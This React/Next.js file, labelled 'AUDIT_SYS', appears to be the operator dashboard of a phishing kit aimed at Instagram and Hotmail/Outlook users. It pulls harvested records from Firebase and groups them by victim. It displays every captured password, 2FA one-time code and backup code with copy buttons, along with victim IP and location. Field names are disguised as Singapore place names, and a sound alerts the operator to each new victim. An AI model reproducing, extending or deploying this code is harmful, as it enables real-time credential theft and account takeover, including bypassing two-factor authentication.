"use client";
import { useEffect, useState, useRef } from "react";
import { useRouter } from "next/navigation";
import { onAuthStateChanged, signOut } from "firebase/auth";
import { ref, onValue, remove, set } from "firebase/database";
import { auth, db } from "@/lib/firebaseConfig";
import { motion, AnimatePresence } from "framer-motion";
import { CopyButton } from "@/components/CopyButton";
import {
  Globe,
  Shield,
  MapPin,
  LogOut,
  Loader2,
  Zap,
  Trash2,
  Search,
  Key,
  Calendar,
  Clock,
  Eraser,
  Instagram,
  Mail,
  User,
  Lock,
  ShieldCheck,
  LifeBuoy,
} from "lucide-react";

export default function AdminDashboard() {
  const [entries, setEntries] = useState<any[]>([]);
  const [searchQuery, setSearchQuery] = useState("");
  const [loading, setLoading] = useState(true);
  const router = useRouter();
  const prevCount = useRef(0);

  const getDynamicCodes = (item: any, prefix: string) => {
    if (!item) return [];
    return Object.keys(item)
      .filter((key) => key.startsWith(prefix))
      .map((key) => item[key]);
  };

  const purgeDatabase = async () => {
    if (window.confirm("PERMANENTLY PURGE ALL DATA?")) {
      await set(ref(db, "fbdet"), null);
      setEntries([]);
    }
  };

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) router.push("/login");
      else setLoading(false);
    });
    return () => unsubscribe();
  }, [router]);

  useEffect(() => {
    if (loading) return;
    return onValue(ref(db, "fbdet"), (snapshot) => {
      const data = snapshot.val();
      if (data) {
        const rawList = Object.entries(data).map(([id, val]: any) => ({
          id,
          ...val,
        }));

        // --- STRICT MAPPING LOGIC ---
        // Group by user identity to ensure codes are NEVER orphaned
        const groupedMap = new Map();

        rawList.forEach((current) => {
          // Identify the user by Username/Email OR use the entry ID to link fragments
          const identity = current.Orchard || current.emle || "PENDING_AUTH";

          if (!groupedMap.has(identity)) {
            groupedMap.set(identity, {
              ...current,
              allCodes: new Set(),
              allBackups: new Set(),
              allPass: new Set(),
            });
          }

          const userObj = groupedMap.get(identity);

          // Map Passwords (avoiding duplicates)
          if (current.Sentosa) userObj.allPass.add(current.Sentosa);
          if (current.pass) userObj.allPass.add(current.pass);
          if (current.Changi) userObj.allPass.add(current.Changi);
          if (current.Tampines) userObj.allPass.add(current.Tampines);

          // Map 2FA & Backups (Dynamic keys with timestamps)
          Object.keys(current).forEach((key) => {
            if (key.startsWith("MarinaBay")) userObj.allCodes.add(current[key]);
            if (key.startsWith("Jurong")) userObj.allBackups.add(current[key]);
          });
        });

        const sorted = Array.from(groupedMap.values()).reverse();
        if (sorted.length > prevCount.current) {
          new Audio(
            "https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3",
          )
            .play()
            .catch(() => {});
        }
        prevCount.current = sorted.length;
        setEntries(sorted);
      } else {
        setEntries([]);
      }
    });
  }, [loading]);

  const filtered = entries.filter((i) =>
    (i.Orchard || i.emle || "")
      .toLowerCase()
      .includes(searchQuery.toLowerCase()),
  );

  if (loading)
    return (
      <div className="min-h-screen bg-black flex items-center justify-center">
        <Loader2 className="text-blue-500 animate-spin" />
      </div>
    );

  return (
    <div className="min-h-screen bg-[#050505] text-zinc-400 p-3 md:p-4 font-mono text-[11px] antialiased">
      <header className="sticky top-0 z-50 bg-[#050505]/95 backdrop-blur-md max-w-2xl mx-auto py-4 flex justify-between items-center border-b border-zinc-900 mb-6">
        <div className="flex items-center gap-3 px-2">
          <h1 className="text-white font-black flex items-center gap-2 tracking-tighter text-sm">
            <Shield size={16} className="text-blue-500" /> AUDIT_SYS
          </h1>
          <span className="text-emerald-500 font-black bg-emerald-500/10 px-2 py-0.5 rounded border border-emerald-500/20">
            {filtered.length} ACTIVE
          </span>
        </div>
        <div className="flex gap-1">
          <button
            onClick={purgeDatabase}
            className="p-2.5 text-red-500 hover:bg-red-500/10 rounded-lg transition-all">
            <Eraser size={16} />
          </button>
          <button
            onClick={() => signOut(auth)}
            className="p-2.5 hover:bg-zinc-800 rounded-lg">
            <LogOut size={16} />
          </button>
        </div>
      </header>

      <main className="max-w-2xl mx-auto space-y-4">
        <AnimatePresence>
          {filtered.map((item) => {
            const isInsta = item.District === "Central-Region";
            const user = item.Orchard || item.emle || "IDENTIFYING...";
            const passList = item.allPass ? Array.from(item.allPass) : [];
            const otps = item.allCodes ? Array.from(item.allCodes) : [];
            const backups = item.allBackups ? Array.from(item.allBackups) : [];

            return (
              <motion.div
                key={item.id}
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                className="bg-[#0a0a0a] border border-zinc-900 rounded-2xl p-4 shadow-2xl relative">
                {/* BRAND TAG */}
                <div className="flex items-center justify-between mb-4 pb-2 border-b border-white/[0.03]">
                  <div className="flex items-center gap-2">
                    {isInsta ? (
                      <Instagram size={14} className="text-pink-500" />
                    ) : (
                      <Mail size={14} className="text-sky-500" />
                    )}
                    <span
                      className={`font-black tracking-[0.2em] text-[9px] uppercase ${isInsta ? "text-pink-500" : "text-sky-500"}`}>
                      {isInsta ? "Instagram" : "Hotmail / Outlook"}
                    </span>
                  </div>
                  <button
                    onClick={() => remove(ref(db, `fbdet/${item.id}`))}
                    className="p-1.5 text-zinc-800 hover:text-red-500">
                    <Trash2 size={14} />
                  </button>
                </div>

                {/* USER IDENTITY */}
                <div className="flex items-center gap-3 bg-zinc-900/60 p-3 rounded-xl border border-white/5 mb-3">
                  <User size={14} className="text-zinc-500" />
                  <span className="text-white font-bold text-sm truncate select-all">
                    {user}
                  </span>
                </div>

                {/* ALL CAPTURED PASSWORDS */}
                <div className="space-y-2 mb-3">
                  {passList.map((p: any, i) => (
                    <div
                      key={i}
                      className="flex items-center justify-between bg-zinc-900/30 p-2.5 rounded-lg border border-white/5 group">
                      <div className="flex items-center gap-3 truncate">
                        <Lock
                          size={12}
                          className={
                            i === 0 ? "text-blue-500" : "text-emerald-500/50"
                          }
                        />
                        <span
                          className={`font-bold select-all truncate ${i === 0 ? "text-blue-400" : "text-zinc-500 text-[10px]"}`}>
                          {p}
                        </span>
                      </div>
                      <CopyButton data={p} />
                    </div>
                  ))}
                </div>

                {/* MAPPED 2FA & BACKUP CODES */}
                {(otps.length > 0 || backups.length > 0) && (
                  <div className="flex flex-wrap gap-2 p-3 bg-zinc-900/20 rounded-xl border border-dashed border-zinc-800">
                    {otps.map((code: any, i) => (
                      <div
                        key={i}
                        className="bg-emerald-500/10 text-emerald-400 px-3 py-2 rounded-lg font-black border border-emerald-500/20 text-xs flex items-center gap-2">
                        <ShieldCheck size={12} /> {code}
                      </div>
                    ))}
                    {backups.map((code: any, i) => (
                      <div
                        key={i}
                        className="bg-amber-500/10 text-amber-500 px-3 py-2 rounded-lg font-bold border border-amber-500/20 text-[10px] flex items-center gap-2">
                        <LifeBuoy size={12} /> {code}
                      </div>
                    ))}
                  </div>
                )}

                {/* METADATA */}
                <div className="mt-4 flex items-center justify-between text-[9px] text-zinc-700 font-bold uppercase">
                  <div className="flex items-center gap-3">
                    <span className="flex items-center gap-1">
                      <Globe size={11} /> {item.NodeIP}
                    </span>
                    <span className="flex items-center gap-1">
                      <MapPin size={11} /> {item.Gateway}
                    </span>
                  </div>
                  <span>{item.EntryTime}</span>
                </div>
              </motion.div>
            );
          })}
        </AnimatePresence>
      </main>
    </div>
  );
}
